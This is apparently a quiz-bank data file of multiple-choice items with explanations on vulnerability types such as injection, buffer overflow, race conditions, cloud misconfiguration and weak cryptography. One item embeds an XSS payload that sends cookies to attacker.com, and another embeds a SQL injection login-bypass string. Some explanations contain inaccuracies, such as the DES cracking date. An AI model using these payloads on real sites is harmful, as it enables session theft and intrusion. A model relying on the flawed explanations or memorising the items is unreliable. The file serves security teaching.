# Domain 2.0 - Threats, Vulnerabilities, and Mitigations
# Subdomain 2.3 - Vulnerability Types
# Format: question|answer_a|answer_b|answer_c|answer_d|correct_idx|explanation|domain|subdomain

What type of vulnerability allows attackers to inject malicious SQL commands into database queries?|Cross-site scripting (XSS)|SQL injection|Buffer overflow|Directory traversal|1|SQL injection vulnerabilities allow attackers to insert malicious SQL commands into input fields that are used in database queries. This can lead to unauthorized data access, modification, or deletion. XSS targets browsers, buffer overflow targets memory, and directory traversal accesses files.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability type allows attackers to write data beyond allocated memory boundaries?|Memory leak|Buffer overflow|Integer overflow|Race condition|1|Buffer overflow vulnerabilities occur when a program writes data beyond the allocated buffer boundaries, potentially overwriting adjacent memory and allowing arbitrary code execution. Memory leaks waste memory, integer overflows cause numerical errors, and race conditions involve timing issues.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What vulnerability allows attackers to inject malicious scripts into web pages viewed by other users?|SQL injection|Cross-site scripting (XSS)|Cross-site request forgery (CSRF)|Directory traversal|1|Cross-site scripting (XSS) allows attackers to inject malicious scripts (usually JavaScript) into web pages that are then executed in other users' browsers. SQL injection targets databases, CSRF exploits authenticated sessions, and directory traversal accesses files.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability allows unauthorized access to files and directories outside the web root?|SQL injection|Directory traversal|XSS|Command injection|1|Directory traversal (path traversal) vulnerabilities allow attackers to access files and directories outside the intended web root using relative path sequences like ../ to navigate the file system. SQL injection targets databases, XSS targets browsers, and command injection executes OS commands.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What type of vulnerability exists when applications fail to properly validate user input?|Race condition|Input validation vulnerability|Cryptographic weakness|Privilege escalation|1|Input validation vulnerabilities occur when applications don't properly validate, sanitize, or filter user input. This can lead to injection attacks (SQL, XSS, command), buffer overflows, and other exploits. Race conditions involve timing, cryptographic weaknesses involve encryption, and privilege escalation gains higher access.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability allows attackers to execute operating system commands through a web application?|SQL injection|Command injection|XSS|CSRF|1|Command injection (OS command injection) allows attackers to execute arbitrary operating system commands through vulnerable web applications that pass unsanitized user input to system shells. SQL injection targets databases, XSS targets browsers, and CSRF exploits sessions.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What is a zero-day vulnerability?|A vulnerability that's been known for years|A vulnerability unknown to the vendor with no patch available|A vulnerability that takes zero days to exploit|A vulnerability with zero impact|1|A zero-day vulnerability is one that is unknown to the software vendor and for which no patch is available. Attackers can exploit these before vendors become aware and create fixes, making them highly valuable and dangerous.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability type allows users to gain higher privileges than intended?|Denial of service|Privilege escalation|Man-in-the-middle|Spoofing|1|Privilege escalation vulnerabilities allow users to gain elevated access rights beyond their authorized level, such as a regular user gaining administrator/root privileges. DoS affects availability, MitM intercepts communications, and spoofing impersonates entities.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What vulnerability exists when cryptographic implementations use weak or outdated algorithms?|Configuration error|Cryptographic vulnerability|Input validation flaw|Race condition|1|Cryptographic vulnerabilities occur when systems use weak, outdated, or improperly implemented encryption algorithms, weak keys, or flawed random number generators. Examples include using MD5, DES, or weak SSL/TLS configurations. Configuration errors are broader, input validation is different, and race conditions involve timing.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability arises from systems running outdated, unsupported operating systems?|Zero-day|End-of-life system vulnerability|Buffer overflow|Injection flaw|1|End-of-life (EOL) system vulnerabilities arise from running unsupported operating systems or software that no longer receive security patches. These systems accumulate known vulnerabilities over time without remediation. Zero-days are unknown vulnerabilities, buffer overflows and injections are specific technical flaws.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What type of vulnerability exists in virtualization when guest VMs can break out to the host?|Container escape|VM escape|Hypervisor vulnerability|Resource exhaustion|1|VM escape (hypervisor escape) is a critical virtualization vulnerability where a guest virtual machine breaks out of its isolation to access the host system or other VMs. Container escape is similar for containers, hypervisor vulnerability is broader, and resource exhaustion is a DoS issue.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which cloud-specific vulnerability involves misconfigurations in storage buckets or permissions?|Insecure APIs|Cloud misconfiguration|VM sprawl|Resource exhaustion|1|Cloud misconfiguration vulnerabilities occur when cloud resources like storage buckets (S3), databases, or access controls are improperly configured, exposing data publicly or granting excessive permissions. Insecure APIs involve programming interfaces, VM sprawl is about management, and resource exhaustion affects availability.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

A web application allows users to submit product reviews without properly sanitizing input. An attacker submits a review containing: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>. What vulnerability is being exploited?|SQL injection|Cross-site scripting (XSS)|Buffer overflow|Directory traversal|1|Cross-site scripting (XSS) represents a significant security concern in web applications due to its potential for malicious code injection, executed in the context of a victim's browser. This can lead to the compromise of user data, session hijacking, and even the defacement of websites. XSS uses the <script> and </script> HTML tags and can include JavaScript (identified with a .js extension). The example shows a script stealing cookies and sending them to an attacker's server. Prevention requires input validation and output encoding to ensure user input is treated as data, not executable code.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker injects malicious SQL code into a login form: ' OR '1'='1' --. The application executes this as part of a database query. What type of vulnerability allows this attack?|Cross-site scripting|SQL injection (SQLI)|Command injection|LDAP injection|1|SQL injection (SQLI) is a type of cyberattack that occurs when an attacker exploits vulnerabilities in a website or application's input fields to manipulate SQL queries executed on the backend database. These attacks can lead to unauthorized access, data breaches, and even the compromise of an entire system. The double hyphen (--) is used to comment out the rest of the original query, effectively ignoring the closing single quote. The modified query will always evaluate '1'='1', which is a true condition, potentially retrieving all records from the database. Mitigation requires stored procedures, parameterized queries/prepared statements, and input validation.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A developer writes code that copies user input into a fixed-size memory buffer without checking the input length. An attacker sends 1000 characters when only 100 are expected. What vulnerability does this represent?|Memory leak|Buffer overflow|Race condition|Integer overflow|1|Buffer overflow attacks occur when too much data is poured into a program's buffer (like overfilling a bucket), causing it to spill over and potentially damage the surrounding area. Attackers flood a program's buffer with excessive data, which can overwrite adjacent memory spaces, disrupt program execution, and open doors for unauthorized access. The repercussions are far-reaching: crashes, system instability, and, most concerning, the execution of arbitrary code by attackers. Real-world example: The Slammer worm (SQL Slammer) in January 2003 exploited a buffer overflow vulnerability in Microsoft SQL Server, spreading rapidly and causing widespread internet disruption. Defense requires input validation, proper memory management, and using programming languages with built-in safeguards.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An airline reservation system allows Alice to check seat availability, then Bob checks availability before Alice completes her booking. Both see the last seat available and both bookings are processed, resulting in an overbooked flight. What vulnerability is this?|Buffer overflow|Race condition|Memory injection|Integer overflow|1|A race condition occurs when two instructions from separate threads attempt to access the same data simultaneously without proper synchronization. Ideally, the developer should have programmed the threads to access the data sequentially. This is referred to as Time-of-Check/Time-of-Use (TOC/TOU). In this scenario, the system fails to properly synchronize access to shared resources (the seat availability), allowing both transactions to proceed simultaneously. Once Alice made her purchase, the system should have checked ticket availability, but the failure to check resulted in a ticket purchase when no ticket was available. Proper synchronization and handling of shared resources in software systems is essential to avoid race conditions.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

In 2017, hackers breached CCleaner's supply chain and injected malicious code into a legitimate software update, which was distributed to millions of users. What type of vulnerability was exploited?|Operating system vulnerability|Malicious update|Firmware vulnerability|Zero-day vulnerability|1|A malicious update vulnerability occurs when a seemingly legitimate software update contains hidden code or alterations crafted by malicious actors. Users, accustomed to welcoming updates that promise better security or enhanced features, unwittingly allow this malicious code entry into their devices. Once the update is installed, the embedded code might grant unauthorized access, compromise sensitive data, or provide a backdoor for future cyberattacks. Cybercriminals exploit the essential trust that users have in software providers. The CCleaner attack allowed hackers to gain unauthorized access to infected systems, collect sensitive information, and potentially deliver additional payloads. Defense requires vigilant update verification, relying on reputable sources, digital signatures, and multi-factor authentication for update installation.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker uses forensic toolkits to analyze applications running in a computer's memory, accessing and manipulating processes and data beyond the intended functionality. What application vulnerability is this?|Buffer overflow|Race condition|Memory injection|Malicious update|2|Memory injection attacks involve the secret insertion of malicious code into a program's memory space, allowing attackers to exploit vulnerabilities to gain unauthorized access or execute arbitrary commands. Forensic toolkits can access and manipulate application processes and data, going beyond the intended functionality. This unauthorized access and manipulation can compromise application security, potentially leading to data breaches, loss of data integrity, and even providing a gateway for broader system compromises. The danger lies in the ability of memory injection attacks to remain undetected by taking advantage of the dynamic nature of memory allocation, bypassing traditional security measures. Defense requires code signing, input validation, and memory protection mechanisms. Example: The Code Red worm (2001) exploited a buffer overflow vulnerability in Microsoft IIS web servers' indexing service to inject malicious code.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A company continues running Windows XP on critical systems despite Microsoft ending support on April 8, 2014. What type of vulnerability does this create?|Application vulnerability|End-of-life (EOL) system vulnerability|Firmware vulnerability|Zero-day vulnerability|1|End-of-life (EOL) signifies the end of a product's life cycle when a system is no longer manufactured, and no spare parts or warranties are supported. When vendors stop supporting software, security patches and updates are no longer provided, leaving known vulnerabilities exposed. Windows XP, developed by Microsoft in 2001, gained popularity but officially ended support in 2014. Legacy systems refer to outdated technologies still in use due to historical significance or critical role in operations. These systems often lack modern security features and may not be compatible with the latest security updates. Attackers can exploit vulnerabilities in legacy systems to gain unauthorized access, as witnessed in numerous high-profile data breaches. The risk with legacy systems is the lack of vendor support as they turn their focus to modern systems.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker exploits a vulnerability in the hypervisor to escape from a virtual machine and gain access to the host system or other VMs. What virtualization vulnerability is this?|VM sprawl|Resource reuse|VM escape|Shared tenancy|2|While virtualization is designed to isolate VMs, the hypervisor (the essential software managing VMs) introduces an unexpected challenge. It can unintentionally create a path for lateral movement (known as moving east to west), enabling potential attackers to move from a secluded VM to the host system or other interconnected VMs. Vulnerabilities within the complex code of the hypervisor can serve as an avenue for unauthorized data access, breaches, and compromise of the system's security. The attacker could attack the hypervisor, host, or other VMs. The danger is that while virtualization promises isolation, hypervisor vulnerabilities can break this isolation. Defense requires deploying robust access controls, instituting network segmentation, fostering isolation among VMs, and keeping the hypervisor and associated software up to date to address known vulnerabilities.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A virtualized environment creates VMs rapidly without proper governance, leading to hundreds of forgotten, unpatched VMs consuming resources. What vulnerability is this?|VM escape|Resource reuse|VM sprawl|Cloud misconfiguration|2|VM sprawl refers to the uncontrolled and excessive creation of VMs within a virtualized environment, leading to management challenges, increased resource consumption, and potential security vulnerabilities. When VMs are created without proper tracking or governance, organizations lose visibility into their infrastructure, resulting in: unpatched and vulnerable systems that attackers can exploit, wasted resources (CPU, memory, storage) on unused VMs, increased attack surface with each unmanaged VM, difficulty maintaining compliance and security standards, and shadow IT risks. Preventing VM sprawl involves implementing automated provisioning, resource monitoring, regular auditing, and clear governance to control the proliferation of VMs and ensure efficient resource utilization in virtualized environments. Organizations should implement VM lifecycle management policies requiring approval for creation and regular decommissioning of unused VMs.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

In a public cloud environment, multiple customers share the same physical infrastructure. A malicious tenant exploits timing differences in shared hardware to infer sensitive data from another tenant's operations. What cloud vulnerability is this?|VM escape|Inadequate configuration management|Side-channel attack via shared tenancy|Identity and access management flaw|2|When utilizing public cloud services, "shared tenancy" refers to multiple customers sharing the same physical infrastructure, where each customer operates within their own isolated virtual environment. If customers don't secure their data properly, that could lead to a side-channel attack where another tenant has access to their data inadvertently. Side-channel attacks exploit information leaked through hardware-level operations such as CPU cache timing, power consumption, or electromagnetic radiation. In a shared tenancy environment, attackers can analyze these subtle indicators to extract sensitive information from co-located tenants. If not managed carefully, security breaches or data leaks in one tenant's environment could inadvertently impact others, underlining the importance of robust security measures and isolation mechanisms to maintain the integrity and confidentiality of each tenant's data and operations.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An organization migrates to the cloud but fails to properly configure security groups, leaving S3 buckets publicly accessible with sensitive customer data exposed. What cloud-specific vulnerability is this?|Shared tenancy risk|Inadequate configuration management|Identity and access management flaw|CASB misconfiguration|1|Cloud services offer an abundance of intricate settings, configurations, and permissions. A lack of understanding or mishandling of these configurations can result in inadvertently exposed resources or open ports, paving the way for malicious infiltrations. Common cloud misconfigurations include: publicly accessible storage buckets (S3, Azure Blob), overly permissive security groups allowing unrestricted access, disabled encryption for data at rest or in transit, exposed databases without authentication, unrestricted network access to management interfaces, and disabled logging/monitoring. The complexity of cloud environments, combined with rapid deployment pressures and lack of cloud security expertise, makes misconfiguration one of the leading causes of cloud data breaches. Organizations must implement Infrastructure as Code (IaC) with security scanning, cloud security posture management (CSPM) tools, and regular security audits.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A cloud environment has weak authentication mechanisms and misconfigured user permissions, allowing an attacker with compromised credentials to access resources far beyond their authorized scope. What vulnerability is this?|Shared tenancy|Inadequate configuration management|Identity and access management (IAM) flaw|VM escape|2|Misconfigured user permissions, compromised credentials, or weak authentication mechanisms create turbulence in cloud environments, enabling unauthorized users to breach the cloud and compromise accounts. Common IAM vulnerabilities include: excessive permissions violating least privilege principle, shared accounts without individual accountability, weak password policies without MFA enforcement, orphaned accounts of former employees still active, service accounts with overly broad permissions, lack of privileged access management (PAM), and insufficient monitoring of authentication events. IAM flaws are particularly dangerous in cloud environments because: cloud resources are accessible from anywhere, attackers can pivot between services using stolen credentials, misconfigured IAM policies can expose entire environments, and automated tools can quickly discover and exploit weak IAM configurations. Defense requires: implementing MFA for all accounts, regular IAM audits and permission reviews, principle of least privilege, and monitoring for anomalous access patterns.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An organization uses multiple cloud services (SaaS, IaaS, PaaS) but lacks visibility into which services employees use and whether security policies are enforced across all platforms. What tool addresses this cloud vulnerability?|Firewall|VPN|Cloud Access Security Broker (CASB)|Intrusion Prevention System|2|A Cloud Access Security Broker (CASB) enforces a company's security policies, bridging the gap between on-premises infrastructure and the dynamic cloud environment. Unlike traditional group policies, the cloud lacks a unified governing mechanism. CASB assumes the crucial role of overseeing all cloud clients, ensuring their security and that all devices are patched. They have visibility across all of the platforms. CASB capabilities include: discovering shadow IT (unauthorized cloud services), enforcing data loss prevention (DLP) policies across cloud applications, providing threat protection against cloud-based malware, ensuring compliance with regulatory requirements, controlling access based on user/device/location context, and monitoring for anomalous behavior. CASBs address the challenge that traditional network security tools cannot inspect encrypted cloud traffic or enforce policies in SaaS applications. Organizations implementing CASB gain centralized visibility and control over cloud usage while maintaining business agility.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A company's software supply chain is compromised when a third-party code library used in their application contains pre-existing malware. What supply chain vulnerability does this represent?|Service provider vulnerability|Hardware provider vulnerability|Software provider vulnerability|Firmware vulnerability|2|When software developers build an application, they use third-party code libraries. These are reusable blocks of code that can be altered to simplify the process of application creation, allowing developers to avoid reinventing the wheel for common operations. However, these third-party libraries cannot be trusted, as they may already contain malware. Software vendors play a crucial role in delivering essential applications and tools. Vulnerabilities in the software supply chain, such as insecure coding practices or unpatched software, can expose businesses to cybersecurity threats, including malware infections and system compromises. Software providers must produce a bill of materials declaring the materials used to make the product. Defense requires: software composition analysis (SCA) tools to identify vulnerable dependencies, vetting third-party libraries before inclusion, monitoring for security advisories affecting dependencies, using package managers with security scanning, and implementing software supply chain security frameworks.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

Counterfeit hardware components with pre-installed backdoors infiltrate a company's supply chain during manufacturing. What type of supply chain vulnerability is this?|Service provider vulnerability|Hardware provider vulnerability|Software provider vulnerability|Cloud provider vulnerability|1|Hardware forms the backbone of IT infrastructure, making hardware providers a critical part of the supply chain. Counterfeit hardware or compromised components can infiltrate the supply chain, introducing potential vulnerabilities that compromise system integrity, resilience, and data confidentiality. Hardware supply chain attacks can include: pre-installed firmware backdoors, compromised components inserted during manufacturing, malicious chips added to circuit boards, or compromised BIOS/UEFI firmware. The hardware supply chain is particularly concerning because: firmware-level compromises are extremely difficult to detect with traditional security tools, hardware cannot be easily "patched" like software, procurement processes often don't include security verification of hardware components, and nation-state actors have resources to compromise manufacturing facilities. Organizations must conduct due diligence in selecting hardware suppliers, consider trusted foundries for critical hardware, and implement supply chain risk management strategies.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A Certificate Authority (CA) is compromised, allowing attackers to generate fraudulent certificates for legitimate websites. What cryptographic vulnerability does this represent?|Key compromise|Certificate Authority compromise|Outdated algorithm|Flawed implementation|1|The digital world relies on Certificate Authorities to issue digital certificates that establish trust in online communications. If a CA is compromised, attackers can generate fraudulent certificates, leading to the interception of encrypted communications and the potential for widespread breaches. With fraudulent certificates, attackers can: perform man-in-the-middle attacks appearing as legitimate sites, sign malware to appear trusted by operating systems, bypass certificate-based authentication, and undermine the entire public key infrastructure (PKI) trust model. Real-world examples include the DigiNotar breach (2011) where attackers issued fraudulent certificates for Google and other major sites, and the Comodo breach (2011). Defense requires: certificate pinning for critical applications, monitoring Certificate Transparency logs for unauthorized certificates, using multiple CAs for validation, and rapid certificate revocation when compromises are detected. Organizations should monitor for unexpected certificate issuances for their domains.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker steals a private encryption key through social engineering, gaining the ability to decrypt all past communications encrypted with the corresponding public key. What cryptographic vulnerability is this?|Certificate Authority compromise|Key compromise|Side-channel attack|Backdoor exploitation|1|Cryptographic systems are only as strong as their keys. A key can be compromised due to theft, weak generation, or poor key management, leading to unauthorized data access, manipulation, or decryption. Key compromise scenarios include: theft through social engineering or physical access, extraction from poorly protected key storage, interception during key exchange, weak key generation using predictable random number generators, and insider threats with privileged access. The impact of key compromise is severe: all data encrypted with the compromised key can be decrypted, digital signatures can be forged, and authentication mechanisms can be bypassed. For asymmetric encryption, compromising a private key exposes all communications; for symmetric encryption, compromising the shared key affects all parties. Defense requires: secure key management with strict policies for generation, storage, and rotation, Hardware Security Modules (HSMs) for critical keys, key escrow for recovery scenarios, and regular key rotation to limit exposure windows.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A developer implements AES-256 encryption but stores encryption keys in plaintext within the application's source code. What cryptographic vulnerability is this?|Outdated algorithm|Flawed implementation|Key compromise|Backdoor exploitation|1|Even the most robust cryptographic algorithms can be undermined by flawed implementation. Poorly coded encryption routines and weak key management can create openings that adversaries can exploit. Common implementation flaws include: hardcoding encryption keys in source code, using non-random or predictable initialization vectors (IVs), failing to validate certificate chains properly, improper use of encryption modes (ECB instead of CBC/GCM), reusing nonces in stream ciphers, and implementing custom cryptography instead of using proven libraries. The principle "don't roll your own crypto" exists because: cryptographic algorithms are mathematically complex, subtle implementation errors can completely break security, timing attacks can exploit implementation details, and proven libraries have undergone extensive security review. Even when using strong algorithms like AES-256, improper implementation negates the security benefits. Organizations should: use well-tested cryptographic libraries, follow OWASP cryptographic guidelines, conduct security code reviews, and never store keys in source code or configuration files.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An organization still uses DES (Data Encryption Standard) with 56-bit keys for encrypting sensitive data, despite modern computing power making it vulnerable to brute-force attacks. What cryptographic vulnerability is this?|Flawed implementation|Outdated algorithm|Key compromise|Certificate compromise|1|As technology advances, cryptographic algorithms that were once secure may become vulnerable to emerging attack techniques or increased computational power. Relying on outdated algorithms exposes data to potential breaches. Examples of outdated algorithms include: DES (Data Encryption Standard) with 56-bit keys (replaced by AES), MD5 for hashing (collision attacks demonstrated), SHA-1 for signatures (deprecated by major browsers), RC4 stream cipher (multiple vulnerabilities), and 3DES (triple DES, being phased out). Modern computing power, including distributed computing and GPU-accelerated cracking, can break these older algorithms in reasonable timeframes. The DES Challenge in 1997 demonstrated breaking DES in under 24 hours. Organizations must: inventory cryptographic usage across systems, develop migration plans from deprecated algorithms, follow NIST and industry guidance on algorithm selection, and implement crypto-agility to facilitate future algorithm transitions. Current recommendations include AES-256, SHA-256/SHA-3, and RSA-2048 or higher.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker analyzes power consumption patterns of a cryptographic device during encryption operations to deduce the encryption key. What type of cryptographic vulnerability is this?|Key compromise|Backdoor exploitation|Side-channel attack|Flawed implementation|2|Cryptographic operations can inadvertently leak information through side-channels such as power consumption, timing, or electromagnetic radiation. Attackers skilled in exploiting these subtle indicators can compromise encryption keys or data. Types of side-channel attacks include: power analysis (monitoring power consumption during cryptographic operations), timing attacks (measuring how long operations take), electromagnetic analysis (capturing EM emissions), acoustic cryptanalysis (analyzing sounds from hardware), and cache-timing attacks (exploiting CPU cache behavior). Side-channel attacks are particularly dangerous because: they exploit physical characteristics rather than mathematical weaknesses, they can break mathematically strong encryption, they often require physical proximity but can sometimes be performed remotely, and they bypass traditional software security measures. Defense requires: constant-time implementations that don't vary execution time, power analysis countermeasures in hardware, electromagnetic shielding for sensitive operations, and blinding techniques that obscure intermediate values. Side-channel attacks require specialized knowledge but are increasingly accessible.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A cryptographic system uses a flawed random number generator that produces predictable sequences, allowing attackers to guess encryption keys. What cryptographic vulnerability is this?|Outdated algorithm|Flawed random number generation|Key compromise|Side-channel attack|1|Secure encryption relies on truly random numbers to generate cryptographic keys. Flawed or predictable random number generation can lead to weak keys and compromised security. Random number generation vulnerabilities include: using system time as sole entropy source (predictable), insufficiently seeded pseudo-random number generators (PRNGs), using random() functions not designed for cryptography, poor entropy collection on embedded devices, and predictable random number generation in programming languages. The consequences are severe: weak keys that can be brute-forced, predictable nonces allowing encryption to be broken, and reproducible "random" values enabling attack replay. The Debian OpenSSL vulnerability (2008) resulted from a change that reduced entropy, making only 32,768 possible SSH keys instead of billions. Defense requires: using cryptographically secure random number generators (CSRNGs), ensuring sufficient entropy sources (hardware RNGs, user input, system events), proper seeding of PRNGs, and testing random number quality. Operating systems provide cryptographic-quality randomness through /dev/urandom (Linux) or CryptGenRandom (Windows).|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker performs an SSL downgrade attack, intercepting HTTPS traffic and forcing the connection to use older, weaker SSL protocols. What cryptographic attack is this?|Key compromise|SSL stripping|SSL/TLS downgrade|Side-channel attack|2|In an SSL/TLS downgrade attack, SSL traffic is intercepted by a server pretending to have an older, less secure browser. To communicate with that server, SSL switches to a weaker (supposedly compatible) encryption method, and it is then easy for hackers to see private information. An example is the POODLE attack (Padding Oracle On Downgraded Legacy Encryption), a man-in-the-middle attack targeting older versions of SSL used by outdated browsers. Downgrade attacks exploit backward compatibility, where servers support older protocols for legacy clients. The attacker positions themselves between client and server, manipulating protocol negotiation to force use of weaker versions (SSL 3.0, TLS 1.0) with known vulnerabilities. Once downgraded, the attacker exploits weaknesses in the older protocol. Defense requires: disabling support for SSL 3.0 and TLS 1.0, implementing TLS 1.2 or higher as minimum, using HSTS (HTTP Strict Transport Security) to prevent downgrade, and monitoring for protocol version anomalies.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An attacker intercepts HTTPS connections and converts them to HTTP, capturing sensitive data like credit card information. What attack is this?|SSL/TLS downgrade|SSL stripping|Certificate spoofing|Man-in-the-middle|1|SSL stripping is an attack where attackers carry out an SSL downgrade attack and manage to bypass certificate-based protection, turning a session into an HTTP attack. They can then capture data such as credit card information. This is known as an HTTPS downgrade attack. SSL stripping differs from SSL/TLS downgrade: stripping removes encryption entirely (HTTPS → HTTP), while downgrade forces weaker but still encrypted protocols. The attack works by: intercepting initial HTTP request before HTTPS redirect, maintaining HTTPS connection to server, presenting HTTP connection to client, and rewriting links to remove HTTPS. The user may not notice because: the attack happens before the browser shows the lock icon, many users don't check for HTTPS, and the site may function normally over HTTP. Defense requires: HSTS (HTTP Strict Transport Security) headers telling browsers to always use HTTPS, HSTS preload lists built into browsers, and educating users to verify HTTPS before entering sensitive data.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A firewall is configured with overly permissive rules allowing unrestricted traffic on ports 21 (FTP), 23 (Telnet), and 3389 (RDP) from the internet. What type of vulnerability is this?|Hardware vulnerability|Misconfiguration vulnerability|Firmware vulnerability|Application vulnerability|1|Firewalls act as a frontline defense against unauthorized access by filtering incoming and outgoing network traffic. Misconfigurations create vulnerabilities including: unauthorized access (mishandling port openings permits cybercriminals to exploit breaches, infiltrating networks and gaining access to sensitive data), malware and attacks (unnecessarily open ports present avenues for malware proliferation or attacker intrusion, even seemingly innocuous ports can be conduits), and regulatory compliance challenges (industries such as healthcare and finance must adhere to stringent regulations; opening ports erroneously may result in non-compliance, subjecting organizations to legal repercussions and financial penalties). A misconfigured firewall can render it ineffective or overly permissive. Overly permissive rules might allow attackers to bypass the firewall and infiltrate the network, while overly restrictive rules could disrupt legitimate communication and hinder business operations. FTP, Telnet, and unrestricted RDP are particularly dangerous because they provide direct system access.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

Network devices are deployed with default credentials (admin/admin) that were never changed. An attacker finds the default credentials online and gains administrative access. What misconfiguration vulnerability is this?|Unpatched software|Excessive privileges|Default credentials/configurations|Open ports|2|Failing to change default usernames, passwords, and configurations of network devices and firewalls is a common oversight that makes it easy for attackers to gain access. Default usernames and passwords for most devices are available on the internet, making this vulnerability trivially exploitable. Default credentials are dangerous because: manufacturers use the same defaults across all devices of a model, credential databases listing defaults are publicly available, automated scanning tools can test thousands of default credentials, and many devices remain with defaults due to oversight or convenience. Common devices left with defaults include: routers and switches (admin/admin, admin/password), IP cameras (admin/12345), IoT devices (root/root), database servers (sa/sa, admin/admin), and application servers. When purchasing a new device, the first thing to do is change default configurations. Defense requires: mandatory password changes during initial setup, automated scanning to detect devices with defaults, password complexity requirements, and periodic auditing of device credentials.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An organization's network devices and firewalls are running firmware from 2015 with multiple known CVE vulnerabilities, but patches have never been applied. What misconfiguration vulnerability is this?|Default credentials|Excessive privileges|Unpatched software|Open ports|2|Neglecting to update firmware and software on network devices and firewalls can leave known vulnerabilities unaddressed, providing an open door for exploitation. Unpatched software is one of the most common and dangerous vulnerabilities because: exploit code for known vulnerabilities is often publicly available, automated tools can scan for and exploit unpatched systems at scale, attackers prioritize unpatched systems as easy targets, and the window between vulnerability disclosure and exploitation is shrinking. Reasons devices remain unpatched include: fear of breaking production systems, lack of maintenance windows, complexity of patching process, devices in forgotten or overlooked locations, and insufficient patch management processes. Critical vulnerabilities to patch include: remote code execution (RCE) vulnerabilities, authentication bypasses, privilege escalation bugs, and vulnerabilities with active exploitation in the wild. Organizations must: implement automated patch management, prioritize patching based on risk and exploitability, test patches in non-production environments first, and maintain accurate inventory of all devices requiring patches. The WannaCry ransomware (2017) spread via an unpatched Windows vulnerability despite patches being available months earlier.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

User accounts across an organization have been granted Domain Admin privileges "just in case they need them." What misconfiguration vulnerability does this represent?|Default credentials|Unpatched software|Excessive privileges|Open ports|2|Granting excessive privileges to user accounts can lead to unauthorized access and privilege abuse. This violates the principle of least privilege, which states users should have only the minimum permissions necessary to perform their job functions. Excessive privileges are dangerous because: compromised regular accounts become highly valuable to attackers, insider threats have greater capacity for damage, accidental misuse can cause significant harm, and privilege creep accumulates over time as permissions are added but never removed. Common excessive privilege scenarios include: all users having administrative rights, service accounts with domain admin privileges, developers having production database access, contractors retaining access after project completion, and shared accounts with broad permissions. The impact includes: lateral movement (attackers pivoting between systems), data exfiltration (accessing sensitive information beyond job needs), destructive actions (deleting or encrypting data), and persistence (creating backdoor accounts with high privileges). Defense requires: regular access reviews and recertification, role-based access control (RBAC) with defined roles, just-in-time (JIT) privileged access, privileged access management (PAM) solutions, and monitoring for privilege escalation attempts.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A user jailbreaks their company iPhone to install unauthorized apps, bypassing Apple's security restrictions. What mobile device vulnerability does this create?|Sideloading|Rooting|Jailbreaking|End-of-life system|2|Jailbreaking applies specifically to Apple devices and allows users to bypass manufacturer or operating system restrictions, providing more control over the device. This is commonly known as unlocking a device. This freedom, however, exposes the device to significant security risks including: counterfeit apps (unregulated stores can host third-party counterfeit or modified versions of legitimate apps that carry hidden malware), software instability (unauthorized software modifications can destabilize the device's operating system, leading to crashes and erratic behavior), and security compromises (jailbreaking undermines device security measures, making it easier for malware and viruses to exploit vulnerabilities). Jailbroken devices bypass: sandboxing that isolates apps, code signing requirements that verify app authenticity, operating system security updates, and enterprise mobile device management (MDM). Organizations typically prohibit jailbroken devices from accessing corporate resources because they cannot be trusted to maintain security posture. Detection requires MDM solutions that check device integrity.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

